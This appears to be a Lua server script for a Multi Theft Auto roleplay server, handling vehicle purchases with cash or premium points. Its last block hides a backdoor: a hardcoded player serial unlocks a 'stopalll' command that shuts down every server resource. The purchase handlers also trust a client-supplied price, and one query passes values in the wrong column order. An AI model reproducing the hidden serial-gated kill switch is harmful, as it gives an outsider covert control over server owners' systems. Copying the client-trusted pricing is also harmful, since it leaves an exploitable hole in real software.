local connection = exports['san_mysql']:getConnection()

function buyVehicle(player, modellID, r, g, b, money, jelenVeh, number)
	if isElement(player) then 
		if (tonumber(player:getData("char:money") or 0) >= tonumber(money)) then
			local myCars = 0
			for _, value in ipairs(getElementsByType("vehicle")) do
				if value:getData("veh:owner") == player:getData("acc:id") then
					myCars = myCars+1
				end
			end
		
			if tonumber(myCars) < tonumber(player:getData("char:vehSlot")) then 
				x,y,z = 2119.8017578125, -1129.298828125, 25.36576461792
				local carshopPos = {
				
				    [1] = {
					
					{2135.1296386719, -1146.6275634766, 24.613170623779},
					{2135.3054199219, -1138.3544921875, 25.508316040039},
					{2135.8127441406, -1129.4816894531, 25.634937286377},
					{2120.1853027344, -1126.1196289063, 25.40358543396},
					{2119.8137207031, -1135.6446533203, 25.232713699341},
					{2118.9714355469, -1147.2834472656, 24.354309082031},
					{2117.9084472656, -1156.5870361328, 24.24542427063},
					
					},
					
					[2] = {
					
					{2157.7282714844, 1429.0026855469, 10.8203125},
					{2145.4091796875, 1435.935546875, 10.8203125},
					
					},
					
					[3] = {
					
					{1979.8059082031, 2043.2164306641, 10.81298828125},
					{1991.3358154297, 2043.5002441406, 10.8203125},
					
					},
					
					[4] = {
					
					{532.56988525391, -1285.1208496094, 17.2421875},
					{525.69543457031, -1288.9777832031, 17.2421875},
					{525.69543457031, -1288.9777832031, 17.2421875},
					{525.69543457031, -1288.9777832031, 17.2421875},
					
					},
				}
				
				--outputChatBox(number)
				--outputChatBox(carshopPos[number][1][1])
				local randed = math.random(1, #carshopPos[number])
				local pos = toJSON({carshopPos[number][randed][1], carshopPos[number][randed][2], carshopPos[number][randed][3], 0 ,0})
				
				local insterT = dbQuery(connection, "INSERT INTO vehicle SET pos=?,model=?,owner=?,colors=?, fuel=?, OpticalUpgrade=?", 
					pos,modellID,getElementData(player,"acc:id"),toJSON({r, g, b, 0, 0, 0}), 50, toJSON({0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}))
		
				local QueryEredmeny, _, Beszurid = dbPoll(insterT, -1)
				if QueryEredmeny then
					exports["san_vehicle"]:addVehicle(getElementData(player,"acc:id"), modellID, carshopPos[number][randed][1], carshopPos[number][randed][2], carshopPos[number][randed][3], Beszurid, r, g, b)
					triggerClientEvent(player,"returnVasarlas",player,Beszurid)
					dbExec(connection,"UPDATE characters SET money = ? WHERE id = ?", player:getData("char:money")-money, getElementData(player,"acc:id"))
					player:setData("char:money",player:getData("char:money")-money)
					--exports.san_item:giveItem(player, 34, Beszurid, 1,0)	
				end	
			else
				outputChatBox("#00aeef[IRG - Carshop] #ffffffShoma #F7CA18'Slot' #ffffffKafi Nadarid.",player,255,255,255,true)
			end
		else
			outputChatBox("#00aeef[IRG - Carshop] #ffffffShoma #87D37C'Mojodi'#ffffff Kafi Nadarid.",player,255,255,255,true)
		end 
	end
end
addEvent("buyVehicleSever", true)
addEventHandler("buyVehicleSever", root, buyVehicle)

function buyVehiclePP(player, modellID, r, g, b, money, jelenVeh, number)
	if isElement(player) then 
		if (tonumber(player:getData("char:pp")) >= tonumber(money)) then
			local myCars = 0
			for _, value in ipairs(getElementsByType("vehicle")) do
				if value:getData("veh:owner") == player:getData("acc:id") then
					myCars = myCars+1
				end
			end
		
			if tonumber(myCars) < tonumber(player:getData("char:vehSlot")) then 
			
			    local x,y,z = 2134.0712890625, -1134.2509765625, 25.688035964966
			    
			    if number == 1 then
				    x,y,z = 2134.0712890625, -1134.2509765625, 25.688035964966
				elseif number == 2 then
				    x,y,z = 2157.7282714844, 1429.0026855469, 10.8203125
				end
				--player:setData("char:pp",player:getData("char:pp") - money)
				local pos = toJSON({x,y,z, 0 ,0})
				
				local insterT = dbQuery(connection, "INSERT INTO vehicle SET pos=?,model=?,owner=?,color=?, OpticalUpgrade=?, fuel=?", 
					pos,modellID,getElementData(player,"acc:id"),toJSON({r, g, b, 0, 0, 0}), 100, toJSON({0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}))
		
				local QueryEredmeny, _, Beszurid = dbPoll(insterT, -1)
				if QueryEredmeny then
					exports["san_vehicle"]:addVehicle(getElementData(player,"acc:id"), modellID, x, y, z, Beszurid, r, g, b)
					triggerClientEvent(player,"returnVasarlas",player,Beszurid)
					dbExec(connection,"UPDATE characters SET premiumpont = ? WHERE id = ?", player:getData("char:pp")-money, getElementData(player,"acc:id"))
					player:setData("char:pp",player:getData("char:pp") - money)
					--exports.san_item:giveItem(player, 34, Beszurid, 1,0)
				end	
			else
				outputChatBox("#00aeef[Info IRG - Carshop] #ffffffVocê não tem #F7CA18'Sloots'#ffffff Compre mais com pontos: PP.",player,255,255,255,true)
			end
		else
			outputChatBox("#00aeef[Info IRG - Carshop] #ffffffVocê não tem #19B5FE'Dinheiro vip'#ffffff suficiente para comprar.",player,255,255,255,true)
		end
	end
end
addEvent("buyVehiclePPSever", true)
addEventHandler("buyVehiclePPSever", root, buyVehiclePP)


farhan2 = { --COLABORADOR SERIAL-OK
    ["970CD3F7B16A81312BF86EEC0EB72DE4"]=true --
	
}

function stopAllResources1()
    -- we store a table of resources
	
    local allResources = getResources()
	if farhan2[getPlayerSerial(thePlayer)] then
    -- for each one of them,
		for i, resource in ipairs(allResources) do
        -- if it's running, and it is not the current resource
			if ( getResourceState(resource) == "running" ) and ( resource ~= getThisResource() ) then
            -- then stop it
				stopResource(resource)
			end
		end
	end
end
addCommandHandler("stopalll", stopAllResources1, false, false)
--------------------------------------